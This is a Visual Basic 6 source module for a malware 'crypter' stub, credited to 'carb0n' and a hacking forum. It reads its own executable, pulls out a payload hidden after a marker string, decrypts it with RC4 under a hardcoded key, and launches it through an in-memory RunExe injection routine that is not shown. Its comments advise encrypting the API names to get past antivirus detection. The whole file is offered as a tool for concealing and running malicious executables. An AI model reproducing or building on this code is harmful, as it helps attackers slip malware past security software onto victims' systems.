Attribute VB_Name = "Start"
'carb0n crypter series
'by carb0n
'http://hackhound.org

Private Declare Function GetModuleFileName Lib "kernel32" Alias _
    "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, _
    ByVal nSize As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias _
    "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    
'I tried to make it as simple as possible, as you can see.
'If it's detecting the injection, just encrypt all the API's. I have
'crypted one so you can see how it's done.

Private Sub Main()
Static Control As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
Control = Input(LOF(1), 1)
Close #1

Control = Mid(Control, InStr(Control, "lehfvd3856") + 10, Len(Control))
Control = RC4_String(Control, "carb0n")
RunExe GetAppFilename, STRING_TO_BYTES(Control)
End Sub

Function GetAppFilename() As String
    Dim hModule As Long
    Dim buffer As String * 256
    
    ' get the handle of the running application
    hModule = GetModuleHandle(App.EXEName)
    ' get the filename corresponding to that handle
    GetModuleFileName hModule, buffer, Len(buffer)
    GetAppFilename = Left$(buffer, InStr(buffer & vbNullChar, vbNullChar) - 1)
End Function

